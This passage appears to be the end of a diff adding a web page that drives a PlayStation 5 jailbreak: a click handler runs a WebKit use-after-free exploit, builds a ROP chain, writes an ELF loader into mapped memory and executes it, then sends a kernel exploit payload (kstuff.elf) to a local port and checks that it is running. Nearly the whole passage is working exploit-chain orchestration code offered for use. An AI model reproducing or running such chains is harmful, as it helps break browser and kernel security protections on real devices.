+    await chain.run();
+    const mappedAddr = p.read8(chain.return_value);
+    log(`mmap elfldr at 0x${mappedAddr.toString()}`, "log-ok");
+
+    const memView = p.array_from_address(mappedAddr, elfData.length);
+    for (let i = 0; i < elfData.length; i++) memView[i] = elfData[i];
+
+    chain.fcall(mappedAddr);
+    await chain.run();
+    log("elfldr entry executed", "log-ok");
+
+    for (let i = 0; i < 60; i++) {
+        await sleep(1000);
+        try {
+            await fetch("http://127.0.0.1:9026/health", { method: "GET", mode: "no-cors" });
+            log("elfldr bound on port 9026", "log-ok");
+            return true;
+        } catch (e) { log(`Waiting for elfldr... ${i+1}/60`, "log-warn"); }
+    }
+    throw new Error("elfldr did not bind on port 9026");
+}
+
+async function loadKstuffViaElfldr() {
+    log("Sending kstuff.elf to elfldr (port 9026)...", "log-info");
+    const res = await fetch("payloads/kstuff.elf");
+    if (!res.ok) throw new Error("Failed to fetch kstuff");
+    const data = await res.arrayBuffer();
+    await fetch("http://127.0.0.1:9026/load", { method: "POST", mode: "no-cors", body: data });
+    log("kstuff sent, waiting for kernel exploit...", "log-info");
+
+    for (let i = 0; i < 90; i++) {
+        await sleep(1000);
+        if (i % 10 === 0) log(`Kernel exploit running... ${i}s`, "log-info");
+    }
+}
+
+async function verifyJailbreak() {
+    log("Verifying jailbreak on port 9020...", "log-info");
+    for (let i = 0; i < 30; i++) {
+        await sleep(1000);
+        try {
+            await fetch("http://127.0.0.1:9020/ping", { method: "GET", mode: "no-cors" });
+            log("Jailbreak verified! kstuff active on port 9020", "log-ok");
+            return true;
+        } catch (e) { log(`Waiting for kstuff... ${i+1}/30`, "log-warn"); }
+    }
+    throw new Error("kstuff not responding on port 9020");
+}
+
+async function runFullExploitChain() {
+    exploitState.stage = "webkit_uaf";
+    updateStageBadge("webkit_uaf");
+    cat.className = "run";
+    msg.textContent = "Running WebKit UAF exploit...";
+    progress.textContent = "";
+
+    try {
+        await runWebKitUAF((detail) => { progress.textContent = detail; });
+        exploitState.webkitExploited = true;
+
+        exploitState.stage = "primitive";
+        updateStageBadge("primitive");
+
+        exploitState.stage = "rop_ready";
+        updateStageBadge("rop_ready");
+        const ropCtx = initROP();
+        exploitState.chain = ropCtx.chain;
+        exploitState.p = ropCtx.p;
+
+        exploitState.stage = "elfldr_load";
+        updateStageBadge("elfldr_load");
+        msg.textContent = "Loading elfldr via ROP...";
+        await loadElfldrViaROP(ropCtx);
+        exploitState.elfldrLoaded = true;
+
+        exploitState.stage = "kernel_exploit";
+        updateStageBadge("kernel_exploit");
+        msg.textContent = "Executing kernel exploit (kstuff)...";
+        await loadKstuffViaElfldr();
+        exploitState.kernelExploited = true;
+
+        exploitState.stage = "verify";
+        updateStageBadge("verify");
+        msg.textContent = "Verifying jailbreak...";
+        await verifyJailbreak();
+
+        exploitState.jailbroken = true;
+        exploitState.stage = "complete";
+        isJailbroken = true;
+        cat.className = "ok";
+        jailbreak.textContent = "JAILBROKEN";
+        jailbreak.classList.add("disabled");
+        jailbreak.classList.remove("running");
+        msg.textContent = "JAILBREAK COMPLETE! Payloads unlocked.";
+        progress.textContent = "";
+        updateStageBadge("complete");
+        updatePayloadsUI();
+        try { localStorage.setItem("ps5_jailbroken", "1"); } catch (e) {}
+        log("=== JAILBREAK COMPLETE ===", "log-ok");
+
+    } catch (err) {
+        exploitState.error = err.message;
+        exploitState.stage = "failed";
+        cat.className = "failed";
+        jailbreak.classList.remove("running");
+        jailbreak.classList.remove("disabled");
+        msg.textContent = `Jailbreak failed: ${err.message}`;
+        progress.textContent = "";
+        updateStageBadge("failed");
+        log(`FAILED: ${err.message}`, "log-err");
+        throw err;
+    }
+}
+
+jailbreak.addEventListener("click", async () => {
+    if (isJailbroken) { msg.textContent = "Already jailbroken!"; return; }
+    if (!entry) { msg.textContent = "Offsets not loaded yet."; return; }
+    jailbreak.classList.add("disabled", "running");
+    await runFullExploitChain();
+});
+
+</script>
+</body>
+</html>
